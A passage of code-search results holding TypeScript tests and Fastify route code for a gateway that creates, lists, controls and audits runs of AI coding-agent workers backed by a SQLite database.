expect(isValidWorkerType('invalid')).toBe(false);\n    expect(isValidWorkerType('CLAUDE')).toBe(false);\n    expect(isValidWorkerType('')).toBe(false);\n  });\n\n  it('should default to claude when workerType not provided', () => {\n    const validateCreateRun = (body: any): boolean => {\n      const workerType = body.workerType || 'claude';\n      return ['claude', 'ollama', 'ollama-launch', 'codex', 'gemini', 'rev'].includes(workerType);\n    };\n\n    expect(validateCreateRun({})).toBe(true);\n    expect(validateCreateRun({ command: 'test' })).toBe(true);\n    expect(validateCreateRun({ workerType: 'ollama' })).toBe(true);\n    expect(validateCreateRun({ workerType: 'invalid' })).toBe(false);\n  });\n\n  it('should allow model parameter for workers that support it', () => {\n    const supportsModel = (workerType: string): boolean => {\n      return ['ollama', 'ollama-launch', 'gemini'].includes(workerType);\n    };\n\n    expect(supportsModel('ollama')).toBe(true);\n    expect(supportsModel('ollama-launch')).toBe(true);\n    expect(supportsModel('gemini')).toBe(true);\n    expect(supportsModel('claude')).toBe(false);\n    expect(supportsModel('codex')).toBe(false);\n    expect(supportsModel('rev')).toBe(false);\n  });\n});\n\ndescribe('Run Schema with Worker Type', () => {\n  it('should accept valid worker types in create request', () => {\n    const validateCreateRun = (body: any): boolean => {\n      const { workerType, model } = body;\n\n      // Validate workerType\n      const validWorkerTypes = ['claude', 'ollama', 'ollama-launch', 'codex', 'gemini', 'rev'];\n      if (workerType && !validWorkerTypes.includes(workerType)) return false;\n\n      // For workers that support model, model is optional but if provided must be string\n      const modelSupportingWorkers = ['ollama', 'ollama-launch', 'gemini'];\n      if (modelSupportingWorkers.includes(workerType) && model && typeof model !== 'string') {\n        return false;\n      }\n\n      return true;\n    };\n\n    expect(validateCreateRun({})).toBe(true);\n    expect(validateCreateRun({ workerType: 'claude' })).toBe(true);\n    expect(validateCreateRun({ workerType: 'ollama', model: 'codellama:7b' })).toBe(true);\n    expect(validateCreateRun({ workerType: 'ollama-launch', model: 'claude' })).toBe(true);\n    expect(validateCreateRun({ workerType: 'gemini', model: 'gemini-pro' })).toBe(true);\n    expect(validateCreateRun({ workerType: 'codex', model: 'should-ignore' })).toBe(true);\n    expect(validateCreateRun({ workerType: 'invalid' })).toBe(false);\n  });\n\n  it('should include worker_type in run response', () => {\n    const mockRun = {\n      id: 'run-123',\n      status: 'running',\n      command: 'test command',\n      worker_type: 'ollama',\n      created_at: 1234567890,\n      started_at: 1234567891\n    };\n\n    expect(mockRun.worker_type).toBe('ollama');\n    expect(typeof mockRun.worker_type).toBe('string');\n  });\n\n  it('should handle missing worker_type in database for backward compatibility', () => {\n    const mockRun: any = {\n      id: 'run-456',\n      status: 'done',\n      command: 'old command',\n      // worker_type not present\n      created_at: 1234567890\n    };\n\n    // Should default to 'claude'\n    const effectiveWorkerType = mockRun.worker_type || 'claude';\n    expect(effectiveWorkerType).toBe('claude');\n  });\n});", "metadata": {"file": "gateway/src/routes/runs.test.ts", "start_line": 201, "end_line": 400, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/routes/runs.test.ts", "location": "gateway/src/routes/runs.test.ts:401", "score": 0.0, "content": "\ndescribe('Run State with Model', () => {\n  it('should include model in metadata for workers that support it', () => {\n    const metadata = {\n      autonomous: true,\n      workingDir: '/project',\n      workerType: 'ollama',\n      model: 'codellama:13b'\n    };\n\n    expect(metadata.workerType).toBe('ollama');\n    expect(metadata.model).toBe('codellama:13b');\n  });\n\n  it('should not include model for workers that dont support it', () => {\n    const metadata: any = {\n      autonomous: false,\n      workingDir: '/project',\n      workerType: 'claude'\n    };\n\n    expect(metadata.workerType).toBe('claude');\n    expect(metadata.model).toBeUndefined();\n  });\n\n  it('should serialize metadata to JSON', () => {\n    const metadata = {\n      autonomous: true,\n      workingDir: '/project',\n      workerType: 'ollama-launch',\n      model: 'claude'\n    };\n\n    const json = JSON.stringify(metadata);\n    const parsed = JSON.parse(json);\n\n    expect(parsed.workerType).toBe('ollama-launch');\n    expect(parsed.model).toBe('claude');\n  });\n});", "metadata": {"file": "gateway/src/routes/runs.test.ts", "start_line": 401, "end_line": 440, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/routes/runs.ts", "location": "gateway/src/routes/runs.ts:1", "score": 0.0, "content": "import type { FastifyInstance, FastifyRequest, FastifyReply } from 'fastify';\nimport { z } from 'zod';\nimport { nanoid } from 'nanoid';\nimport { db } from '../services/database.js';\nimport { config } from '../config.js';\nimport { wrapperAuth, uiAuth, requireRole, logAudit, type AuthenticatedRequest } from '../middleware/auth.js';\nimport { generateCapabilityToken, redactSecrets } from '../utils/crypto.js';\nimport { broadcastToRun } from '../services/websocket.js';\n\n// Validation schemas\nconst createRunSchema = z.object({\n  command: z.string().optional(),\n  label: z.string().max(200).optional(),\n  clientId: z.string().optional(),\n  agentId: z.string().optional(), // For auto-associating with client\n  repoPath: z.string().optional(),\n  repoName: z.string().optional(),\n  tags: z.array(z.string()).optional(),\n  metadata: z.record(z.any()).optional(),\n  workingDir: z.string().optional(),\n  autonomous: z.boolean().optional(),\n  workerType: z.enum(['claude', 'ollama-launch', 'codex', 'gemini', 'rev']).optional().default('claude'),\n  model: z.string().optional(),\n  integration: z.enum(['claude', 'codex', 'opencode', 'droid']).optional() // For ollama-launch\n});\n\nconst listRunsSchema = z.object({\n  status: z.enum(['pending', 'running', 'done', 'failed']).optional(),\n  limit: z.coerce.number().int().min(1).max(1000).default(100),\n  offset: z.coerce.number().int().min(0).default(0),\n  search: z.string().optional()\n});\n\nconst stdinInputSchema = z.object({\n  input: z.string(),\n  escape: z.boolean().optional() // Send escape sequence\n});\n\nconst restartSchema = z.object({\n  command: z.string().optional(), // Override command\n  workingDir: z.string().optional() // Override working directory\n});\n\nconst eventSchema = z.object({\n  type: z.enum(['stdout', 'stderr', 'marker', 'info', 'error', 'assist', 'prompt_waiting', 'prompt_resolved']),\n  data: z.string(),\n  sequence: z.number().int().min(0).optional()\n});\n\nconst commandSchema = z.object({\n  command: z.string()\n});\n\nconst ackSchema = z.object({\n  result: z.string().optional(),\n  error: z.string().optional()\n});\n\nexport async function runsRoutes(fastify: FastifyInstance) {\n  // Create a new run (from UI or self-registration by wrapper)\n  fastify.post('/api/runs', {\n    preHandler: [uiAuth, requireRole('admin', 'operator')]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const body = createRunSchema.parse(request.body);\n    const id = nanoid(12);\n    const capabilityToken = generateCapabilityToken();\n\n    // Find client by agentId if provided\n    let clientId = body.clientId || null;\n    if (!clientId && body.agentId) {\n      const client = db.prepare('SELECT id FROM clients WHERE agent_id = ?').get(body.agentId) as { id: string } | undefined;\n      if (client) {\n        clientId = client.id;\n      }\n    }\n\n    // Merge metadata with workflow control fields\n    const metadata = {\n      ...body.metadata,\n      autonomous: body.autonomous || false,\n      workingDir: body.workingDir,\n      workerType: body.workerType || 'claude',\n      model: body.model,\n      ...(body.integration && { integration: body.integration })\n    };\n\n    const workerType = body.workerType || 'claude';\n\n    db.prepare(`\n      INSERT INTO runs (id, client_id, label, command, repo_path, repo_name, tags, capability_token, metadata, worker_type)\n      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\n    `).run(\n      id,\n      clientId,\n      body.label || null,\n      body.command || null,\n      body.repoPath || null,\n      body.repoName || null,\n      body.tags ? JSON.stringify(body.tags) : null,\n      capabilityToken,\n      JSON.stringify(metadata),\n      workerType\n    );\n\n    // Save initial run state for resume capability\n    if (body.workingDir) {\n      db.prepare(`\n        INSERT INTO run_state (run_id, working_dir, original_command)\n        VALUES (?, ?, ?)\n      `).run(id, body.workingDir, body.command || null);\n    }\n\n    logAudit(request.user?.id, 'run.create', 'run', id, { command: body.command, clientId, autonomous: body.autonomous }, request.ip);\n\n    return {\n      id,\n      capabilityToken, // Only returned on creation\n      status: 'pending',\n      autonomous: body.autonomous || false\n    };\n  });\n\n  // List runs with filtering, search, and pagination\n  fastify.get('/api/runs', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest) => {\n    const {\n      status,\n      clientId,\n      search,\n      repo,\n      waitingApproval,\n      tags,\n      workerType,\n      limit = '50',\n      offset = '0',\n      cursor,\n      sortBy = 'created_at',\n      sortOrder = 'desc'\n    } = request.query as {\n      status?: string;\n      clientId?: string;\n      search?: string;\n      repo?: string;\n      waitingApproval?: string;\n      tags?: string;\n      workerType?: string;\n      limit?: string;\n      offset?: string;\n      cursor?: string;\n      sortBy?: string;\n      sortOrder?: string;\n    };\n\n    let query = `\n      SELECT r.id, r.status, r.label, r.command, r.repo_path, r.repo_name,\n             r.waiting_approval, r.created_at, r.started_at, r.finished_at,\n             r.exit_code, r.error_message, r.metadata, r.tags, r.client_id,\n             c.display_name as client_name, c.status as client_status,\n             (SELECT COUNT(*) FROM artifacts WHERE run_id = r.id) as artifact_count,\n             (SELECT data FROM events WHERE run_id = r.id AND type = 'assist' LIMIT 1) as assist_data,\n             r.worker_type\n      FROM runs r\n      LEFT JOIN clients c ON r.client_id = c.id\n      WHERE 1=1\n    `;\n    const params: any[] = [];\n\n    if (status && status !== 'all') {\n      query += ' AND r.status = ?';\n      params.push(status);\n    }\n\n    if (clientId) {\n      query += ' AND r.client_id = ?';\n      params.push(clientId);\n    }\n\n    if (workerType && workerType !== 'all') {\n      query += ' AND r.worker_type = ?';\n      params.push(workerType);\n    }\n\n    if (search) {\n      query += ' AND (r.id LIKE ? OR r.label LIKE ? OR r.command LIKE ?)';\n      params.push(`%${search}%`, `%${search}%`, `%${search}%`);\n    }\n\n    if (repo) {\n      query += ' AND (r.repo_path LIKE ? OR r.repo_name LIKE ?)';\n      params.push(`%${repo}%`, `%${repo}%`);\n    }\n\n    if (waitingApproval === 'true') {\n      query += ' AND r.waiting_approval = 1';\n    }\n\n    if (tags) {\n      const tagList = tags.split(',');\n      tagList.forEach(tag => {", "metadata": {"file": "gateway/src/routes/runs.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/routes/runs.ts", "location": "gateway/src/routes/runs.ts:201", "score": 0.0, "content": "        query += ' AND r.tags LIKE ?';\n        params.push(`%\"${tag}\"%`);\n      });\n    }\n\n    // Cursor-based pagination (for WebSocket real-time updates)\n    if (cursor) {\n      query += ' AND r.id < ?';\n      params.push(cursor);\n    }\n\n    // Validate sort column\n    const allowedSorts = ['created_at', 'started_at', 'finished_at', 'status'];\n    const sortCol = allowedSorts.includes(sortBy) ? sortBy : 'created_at';\n    const sortDir = sortOrder === 'asc' ? 'ASC' : 'DESC';\n\n    query += ` ORDER BY r.${sortCol} ${sortDir} LIMIT ? OFFSET ?`;\n    params.push(parseInt(limit, 10), parseInt(offset, 10));\n\n    const runs = db.prepare(query).all(...params);\n\n    // Get total count for pagination\n    let countQuery = 'SELECT COUNT(*) as count FROM runs r WHERE 1=1';\n    const countParams: any[] = [];\n    if (status && status !== 'all') {\n      countQuery += ' AND r.status = ?';\n      countParams.push(status);\n    }\n    if (clientId) {\n      countQuery += ' AND r.client_id = ?';\n      countParams.push(clientId);\n    }\n    if (search) {\n      countQuery += ' AND (r.id LIKE ? OR r.label LIKE ? OR r.command LIKE ?)';\n      countParams.push(`%${search}%`, `%${search}%`, `%${search}%`);\n    }\n    if (repo) {\n      countQuery += ' AND (r.repo_path LIKE ? OR r.repo_name LIKE ?)';\n      countParams.push(`%${repo}%`, `%${repo}%`);\n    }\n    if (waitingApproval === 'true') {\n      countQuery += ' AND r.waiting_approval = 1';\n    }\n\n    const { count } = db.prepare(countQuery).get(...countParams) as { count: number };\n\n    return {\n      runs: runs.map((r: any) => ({\n        ...r,\n        metadata: r.metadata ? JSON.parse(r.metadata) : null,\n        tags: r.tags ? JSON.parse(r.tags) : null,\n        hasAssist: !!r.assist_data\n      })),\n      total: count,\n      limit: parseInt(limit, 10),\n      offset: parseInt(offset, 10),\n      hasMore: parseInt(offset, 10) + runs.length < count\n    };\n  });\n\n  // Get single run with full details\n  fastify.get('/api/runs/:runId', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { runId } = request.params as { runId: string };\n\n    const run = db.prepare(`\n      SELECT r.id, r.status, r.label, r.command, r.repo_path, r.repo_name,\n             r.waiting_approval, r.created_at, r.started_at, r.finished_at,\n             r.exit_code, r.error_message, r.metadata, r.tags, r.client_id,\n             c.display_name as client_name, c.agent_id as client_agent_id, c.status as client_status,\n             r.worker_type\n      FROM runs r\n      LEFT JOIN clients c ON r.client_id = c.id\n      WHERE r.id = ?\n    `).get(runId) as any;\n\n    if (!run) {\n      return reply.code(404).send({ error: 'Run not found' });\n    }\n\n    // Get artifacts\n    const artifacts = db.prepare(`\n      SELECT id, name, type, size, created_at\n      FROM artifacts WHERE run_id = ?\n      ORDER BY created_at DESC\n    `).all(runId);\n\n    // Get commands/audit trail\n    const commands = db.prepare(`\n      SELECT id, command, status, created_at, acked_at, result, error\n      FROM commands WHERE run_id = ?\n      ORDER BY created_at DESC\n    `).all(runId);\n\n    // Get assist session if any\n    const assistEvent = db.prepare(`\n      SELECT data FROM events WHERE run_id = ? AND type = 'assist' ORDER BY timestamp DESC LIMIT 1\n    `).get(runId) as { data: string } | undefined;\n\n    // Calculate duration\n    let duration = null;\n    if (run.started_at) {\n      const endTime = run.finished_at || Math.floor(Date.now() / 1000);\n      duration = endTime - run.started_at;\n    }\n\n    return {\n      ...run,\n      metadata: run.metadata ? JSON.parse(run.metadata) : null,\n      tags: run.tags ? JSON.parse(run.tags) : null,\n      artifacts,\n      commands,\n      assistUrl: assistEvent ? JSON.parse(assistEvent.data).url : null,\n      duration\n    };\n  });\n\n  // Get run commands/audit separately (for tab)\n  fastify.get('/api/runs/:runId/audit', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { runId } = request.params as { runId: string };\n\n    const run = db.prepare('SELECT id FROM runs WHERE id = ?').get(runId);\n    if (!run) {\n      return reply.code(404).send({ error: 'Run not found' });\n    }\n\n    const commands = db.prepare(`\n      SELECT id, command, status, created_at, acked_at, result, error\n      FROM commands WHERE run_id = ?\n      ORDER BY created_at DESC\n    `).all(runId);\n\n    // Get related audit entries\n    const auditEntries = db.prepare(`\n      SELECT id, user_id, action, details, ip_address, timestamp\n      FROM audit_log\n      WHERE target_type = 'run' AND target_id = ?\n      ORDER BY timestamp DESC\n      LIMIT 50\n    `).all(runId);\n\n    return { commands, auditEntries };\n  });\n\n  // Get run events (with pagination)\n  fastify.get('/api/runs/:runId/events', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { runId } = request.params as { runId: string };\n    const { after, limit } = request.query as { after?: string; limit?: string };\n\n    const run = db.prepare('SELECT id FROM runs WHERE id = ?').get(runId);\n    if (!run) {\n      return reply.code(404).send({ error: 'Run not found' });\n    }\n\n    const afterId = after ? parseInt(after, 10) : 0;\n    const limitNum = Math.min(parseInt(limit || '100', 10), 1000);\n\n    const events = db.prepare(`\n      SELECT id, type, data, timestamp, sequence\n      FROM events\n      WHERE run_id = ? AND id > ?\n      ORDER BY id ASC\n      LIMIT ?\n    `).all(runId, afterId, limitNum);\n\n    return events;\n  });\n\n  // Wrapper: ingest event\n  fastify.post('/api/ingest/event', {\n    preHandler: [wrapperAuth]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const body = eventSchema.parse(request.body);\n    const runId = request.runAuth?.runId;\n\n    if (!runId) {\n      return reply.code(400).send({ error: 'Run ID required' });\n    }\n\n    // Redact secrets from data\n    const sanitizedData = redactSecrets(body.data);\n\n    const result = db.prepare(`\n      INSERT INTO events (run_id, type, data, sequence)\n      VALUES (?, ?, ?, ?)\n    `).run(runId, body.type, sanitizedData, body.sequence || 0);\n\n    // Update run status if needed\n    if (body.type === 'marker') {\n      const marker = JSON.parse(body.data);\n      if (marker.event === 'started') {\n        db.prepare('UPDATE runs SET status = ?, started_at = unixepoch() WHERE id = ?')\n          .run('running', runId);\n      } else if (marker.event === 'finished') {\n        db.prepare('UPDATE runs SET status = ?, finished_at = unixepoch(), exit_code = ? WHERE id = ?')", "metadata": {"file": "gateway/src/routes/runs.ts", "start_line": 201, "end_line": 400, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/routes/runs.ts", "location": "gateway/src/routes/runs.ts:401", "score": 0.0, "content": "          .run(marker.exitCode === 0 ? 'done' : 'failed', marker.exitCode, runId);\n      }\n    }\n\n    // Broadcast to WebSocket subscribers\n    broadcastToRun(runId, {\n      type: 'event',\n      eventId: result.lastInsertRowid,\n      eventType: body.type,\n      data: sanitizedData,\n      timestamp: Math.floor(Date.now() / 1000)\n    });\n\n    return { ok: true, eventId: result.lastInsertRowid };\n  });\n\n  // UI: send command to wrapper\n  fastify.post('/api/runs/:runId/command', {\n    preHandler: [uiAuth, requireRole('admin', 'operator')]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { runId } = request.params as { runId: string };\n    const body = commandSchema.parse(request.body);\n\n    // Validate run exists and is running\n    const run = db.prepare('SELECT status FROM runs WHERE id = ?').get(runId) as any;\n    if (!run) {\n      return reply.code(404).send({ error: 'Run not found' });\n    }\n    if (run.status !== 'running') {\n      return reply.code(400).send({ error: 'Run is not active' });\n    }\n\n    // Validate command is allowlisted\n    const cmdBase = body.command.trim();\n    const isAllowed = config.allowlistedCommands.some(allowed =>\n      cmdBase === allowed || cmdBase.startsWith(allowed + ' ')\n    );\n\n    if (!isAllowed) {\n      logAudit(request.user?.id, 'command.rejected', 'run', runId, { command: body.command }, request.ip);\n      return reply.code(403).send({\n        error: 'Command not in allowlist',\n        allowedCommands: config.allowlistedCommands\n      });\n    }\n\n    const id = nanoid(12);\n    db.prepare(`\n      INSERT INTO commands (id, run_id, command)\n      VALUES (?, ?, ?)\n    `).run(id, runId, body.command);\n\n    logAudit(request.user?.id, 'command.sent', 'run', runId, { commandId: id, command: body.command }, request.ip);\n\n    // Notify via WebSocket\n    broadcastToRun(runId, {\n      type: 'command_queued',\n      commandId: id,\n      command: body.command\n    });\n\n    return { commandId: id };\n  });\n\n  // Wrapper: poll for commands\n  fastify.get('/api/runs/:runId/commands', {\n    preHandler: [wrapperAuth]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { runId } = request.params as { runId: string };\n\n    if (request.runAuth?.runId !== runId) {\n      return reply.code(403).send({ error: 'Capability token mismatch' });\n    }\n\n    const commands = db.prepare(`\n      SELECT id, command, created_at\n      FROM commands\n      WHERE run_id = ? AND status = 'pending'\n      ORDER BY created_at ASC\n    `).all(runId);\n\n    return commands;\n  });\n\n  // Wrapper: acknowledge command\n  fastify.post('/api/runs/:runId/commands/:commandId/ack', {\n    preHandler: [wrapperAuth]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { runId, commandId } = request.params as { runId: string; commandId: string };\n    const body = ackSchema.parse(request.body);\n\n    if (request.runAuth?.runId !== runId) {\n      return reply.code(403).send({ error: 'Capability token mismatch' });\n    }\n\n    db.prepare(`\n      UPDATE commands\n      SET status = 'completed', acked_at = unixepoch(), result = ?, error = ?\n      WHERE id = ? AND run_id = ?\n    `).run(body.result || null, body.error || null, commandId, runId);\n\n    // Broadcast result to UI\n    broadcastToRun(runId, {\n      type: 'command_completed',\n      commandId,\n      result: body.result,\n      error: body.error\n    });\n\n    return { ok: true };\n  });\n\n  // Stop run request\n  fastify.post('/api/runs/:runId/stop', {\n    preHandler: [uiAuth, requireRole('admin', 'operator')]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { runId } = request.params as { runId: string };\n\n    const run = db.prepare('SELECT status FROM runs WHERE id = ?').get(runId) as any;\n    if (!run) {\n      return reply.code(404).send({ error: 'Run not found' });\n    }\n\n    // Queue stop command\n    const id = nanoid(12);\n    db.prepare(`\n      INSERT INTO commands (id, run_id, command)\n      VALUES (?, ?, ?)\n    `).run(id, runId, '__STOP__');\n\n    logAudit(request.user?.id, 'run.stop_requested', 'run', runId, {}, request.ip);\n\n    broadcastToRun(runId, {\n      type: 'stop_requested',\n      commandId: id\n    });\n\n    return { ok: true, commandId: id };\n  });\n\n  // Delete run\n  fastify.delete('/api/runs/:runId', {\n    preHandler: [uiAuth, requireRole('admin')]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { runId } = request.params as { runId: string };\n\n    const run = db.prepare('SELECT id FROM runs WHERE id = ?').get(runId);\n    if (!run) {\n      return reply.code(404).send({ error: 'Run not found' });\n    }\n\n    db.prepare('DELETE FROM runs WHERE id = ?').run(runId);\n    logAudit(request.user?.id, 'run.delete', 'run', runId, {}, request.ip);\n\n    return { ok: true };\n  });\n\n  // Hard halt run (immediate SIGKILL)\n  fastify.post('/api/runs/:runId/halt', {\n    preHandler: [uiAuth, requireRole('admin', 'operator')]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { runId } = request.params as { runId: string };\n\n    const run = db.prepare('SELECT status FROM runs WHERE id = ?').get(runId) as any;\n    if (!run) {\n      return reply.code(404).send({ error: 'Run not found' });\n    }\n\n    if (run.status !== 'running') {\n      return reply.code(400).send({ error: 'Run is not active' });\n    }\n\n    // Queue hard halt command\n    const id = nanoid(12);\n    db.prepare(`\n      INSERT INTO commands (id, run_id, command)\n      VALUES (?, ?, ?)\n    `).run(id, runId, '__HALT__');\n\n    logAudit(request.user?.id, 'run.halt_requested', 'run', runId, {}, request.ip);\n\n    broadcastToRun(runId, {\n      type: 'halt_requested',\n      commandId: id\n    });\n\n    return { ok: true, commandId: id };\n  });\n\n  // Restart run with same or new configuration\n  fastify.post('/api/runs/:runId/restart', {\n    preHandler: [uiAuth, requireRole('admin', 'operator')]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { runId } = request.params as { runId: string };\n    const body = restartSchema.parse(request.body || {});\n\n    const run = db.prepare(`\n      SELECT id, status, command, metadata FROM runs WHERE id = ?\n    `).get(runId) as any;\n    if (!run) {", "metadata": {"file": "gateway/src/routes/runs.ts", "start_line": 401, "end_line": 600, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/routes/runs.ts", "location": "gateway/src/routes/runs.ts:601", "score": 0.0, "content": "      return reply.code(404).send({ error: 'Run not found' });\n    }\n\n    // Get saved run state\n    const state = db.prepare(`\n      SELECT working_dir, original_command FROM run_state WHERE run_id = ?\n    `).get(runId) as any;\n\n    // Create new run with same/overridden config\n    const newId = nanoid(12);\n    const newToken = generateCapabilityToken();\n    const metadata = run.metadata ? JSON.parse(run.metadata) : {};\n\n    const newCommand = body.command || run.command || state?.original_command;\n    const newWorkingDir = body.workingDir || metadata.workingDir || state?.working_dir;\n\n    const newMetadata = {\n      ...metadata,\n      workingDir: newWorkingDir,\n      restartedFrom: runId\n    };\n\n    db.prepare(`\n      INSERT INTO runs (id, command, capability_token, metadata)\n      VALUES (?, ?, ?, ?)\n    `).run(newId, newCommand, newToken, JSON.stringify(newMetadata));\n\n    // Save state for new run\n    if (newWorkingDir) {\n      db.prepare(`\n        INSERT INTO run_state (run_id, working_dir, original_command)\n        VALUES (?, ?, ?)\n      `).run(newId, newWorkingDir, newCommand);\n    }\n\n    logAudit(request.user?.id, 'run.restart', 'run', newId, {\n      originalRunId: runId,\n      command: newCommand\n    }, request.ip);\n\n    return {\n      id: newId,\n      capabilityToken: newToken,\n      status: 'pending',\n      restartedFrom: runId\n    };\n  });\n\n  // Send stdin input to running process\n  fastify.post('/api/runs/:runId/input', {\n    preHandler: [uiAuth, requireRole('admin', 'operator')]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { runId } = request.params as { runId: string };\n    const body = stdinInputSchema.parse(request.body);\n\n    const run = db.prepare('SELECT status FROM runs WHERE id = ?').get(runId) as any;\n    if (!run) {\n      return reply.code(404).send({ error: 'Run not found' });\n    }\n\n    if (run.status !== 'running') {\n      return reply.code(400).send({ error: 'Run is not active' });\n    }\n\n    // Build the input command with optional escape\n    let inputData = body.input;\n    if (body.escape) {\n      // Send escape sequence (Ctrl+C equivalent)\n      inputData = '\\x03' + inputData;\n    }\n\n    const id = nanoid(12);\n    db.prepare(`\n      INSERT INTO commands (id, run_id, command)\n      VALUES (?, ?, ?)\n    `).run(id, runId, `__INPUT__:${inputData}`);\n\n    logAudit(request.user?.id, 'run.input_sent', 'run', runId, {\n      escape: body.escape,\n      length: body.input.length\n    }, request.ip);\n\n    broadcastToRun(runId, {\n      type: 'input_sent',\n      commandId: id,\n      escape: body.escape\n    });\n\n    return { ok: true, commandId: id };\n  });\n\n  // Send escape/interrupt to running process\n  fastify.post('/api/runs/:runId/escape', {\n    preHandler: [uiAuth, requireRole('admin', 'operator')]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { runId } = request.params as { runId: string };\n\n    const run = db.prepare('SELECT status FROM runs WHERE id = ?').get(runId) as any;\n    if (!run) {\n      return reply.code(404).send({ error: 'Run not found' });\n    }\n\n    if (run.status !== 'running') {\n      return reply.code(400).send({ error: 'Run is not active' });\n    }\n\n    const id = nanoid(12);\n    db.prepare(`\n      INSERT INTO commands (id, run_id, command)\n      VALUES (?, ?, ?)\n    `).run(id, runId, '__ESCAPE__');\n\n    logAudit(request.user?.id, 'run.escape_sent', 'run', runId, {}, request.ip);\n\n    broadcastToRun(runId, {\n      type: 'escape_sent',\n      commandId: id\n    });\n\n    return { ok: true, commandId: id };\n  });\n\n  // Get run state for resume\n  fastify.get('/api/runs/:runId/state', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { runId } = request.params as { runId: string };\n\n    const run = db.prepare(`\n      SELECT id, status, command, created_at, started_at, finished_at, exit_code, metadata\n      FROM runs WHERE id = ?\n    `).get(runId) as any;\n\n    if (!run) {\n      return reply.code(404).send({ error: 'Run not found' });\n    }\n\n    const state = db.prepare(`\n      SELECT working_dir, original_command, last_sequence, stdin_buffer, environment\n      FROM run_state WHERE run_id = ?\n    `).get(runId) as any;\n\n    // Get last few events for context\n    const recentEvents = db.prepare(`\n      SELECT id, type, data, timestamp, sequence\n      FROM events\n      WHERE run_id = ?\n      ORDER BY id DESC\n      LIMIT 50\n    `).all(runId);\n\n    return {\n      run: {\n        ...run,\n        metadata: run.metadata ? JSON.parse(run.metadata) : null\n      },\n      state: state || null,\n      recentEvents: recentEvents.reverse(),\n      canResume: run.status === 'done' || run.status === 'failed'\n    };\n  });\n\n  // Wrapper: update run state\n  fastify.post('/api/runs/:runId/state', {\n    preHandler: [wrapperAuth]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { runId } = request.params as { runId: string };\n    const body = request.body as {\n      workingDir?: string;\n      lastSequence?: number;\n      stdinBuffer?: string;\n      environment?: Record<string, string>;\n    };\n\n    if (request.runAuth?.runId !== runId) {\n      return reply.code(403).send({ error: 'Capability token mismatch' });\n    }\n\n    // Upsert run state\n    db.prepare(`\n      INSERT INTO run_state (run_id, working_dir, last_sequence, stdin_buffer, environment)\n      VALUES (?, ?, ?, ?, ?)\n      ON CONFLICT(run_id) DO UPDATE SET\n        working_dir = COALESCE(excluded.working_dir, run_state.working_dir),\n        last_sequence = COALESCE(excluded.last_sequence, run_state.last_sequence),\n        stdin_buffer = COALESCE(excluded.stdin_buffer, run_state.stdin_buffer),\n        environment = COALESCE(excluded.environment, run_state.environment),\n        updated_at = unixepoch()\n    `).run(\n      runId,\n      body.workingDir || process.cwd(),\n      body.lastSequence || 0,\n      body.stdinBuffer || null,\n      body.environment ? JSON.stringify(body.environment) : null\n    );\n\n    return { ok: true };\n  });\n}", "metadata": {"file": "gateway/src/routes/runs.ts", "start_line": 601, "end_line": 799, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/services/database.test.ts", "location": "gateway/src/services/database.test.ts:1", "score": 0.0, "content": "import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'vitest';\nimport Database from 'better-sqlite3';\nimport { mkdirSync, rmSync, existsSync } from 'fs';\nimport { join } from 'path';\n\n// Create a test database\nconst testDir = join(process.cwd(), '.test-data');\nconst testDbPath = join(testDir, 'test.sqlite');\n\ndescribe('Database Schema', () => {\n  let db: Database.Database;\n\n  beforeAll(() => {\n    if (!existsSync(testDir)) {\n      mkdirSync(testDir, { recursive: true });\n    }\n\n    db = new Database(testDbPath);\n    db.pragma('journal_mode = WAL');\n    db.pragma('foreign_keys = ON');\n\n    // Initialize schema (copy from database.ts)\n    db.exec(`\n      CREATE TABLE IF NOT EXISTS runs (\n        id TEXT PRIMARY KEY,\n        status TEXT NOT NULL DEFAULT 'pending',\n        command TEXT,\n        created_at INTEGER NOT NULL DEFAULT (unixepoch()),\n        started_at INTEGER,\n        finished_at INTEGER,\n        exit_code INTEGER,\n        error_message TEXT,\n        capability_token TEXT NOT NULL,\n        metadata TEXT\n      );\n\n      CREATE TABLE IF NOT EXISTS events (\n        id INTEGER PRIMARY KEY AUTOINCREMENT,\n        run_id TEXT NOT NULL REFERENCES runs(id) ON DELETE CASCADE,\n        type TEXT NOT NULL,\n        data TEXT,\n        timestamp INTEGER NOT NULL DEFAULT (unixepoch()),\n        sequence INTEGER NOT NULL DEFAULT 0\n      );\n      CREATE INDEX IF NOT EXISTS idx_events_run_id ON events(run_id);\n\n      CREATE TABLE IF NOT EXISTS commands (\n        id TEXT PRIMARY KEY,\n        run_id TEXT NOT NULL REFERENCES runs(id) ON DELETE CASCADE,\n        command TEXT NOT NULL,\n        status TEXT NOT NULL DEFAULT 'pending',\n        created_at INTEGER NOT NULL DEFAULT (unixepoch()),\n        acked_at INTEGER,\n        result TEXT,\n        error TEXT\n      );\n      CREATE INDEX IF NOT EXISTS idx_commands_run_id ON commands(run_id);\n\n      CREATE TABLE IF NOT EXISTS artifacts (\n        id TEXT PRIMARY KEY,\n        run_id TEXT NOT NULL REFERENCES runs(id) ON DELETE CASCADE,\n        name TEXT NOT NULL,\n        type TEXT NOT NULL,\n        size INTEGER NOT NULL,\n        path TEXT 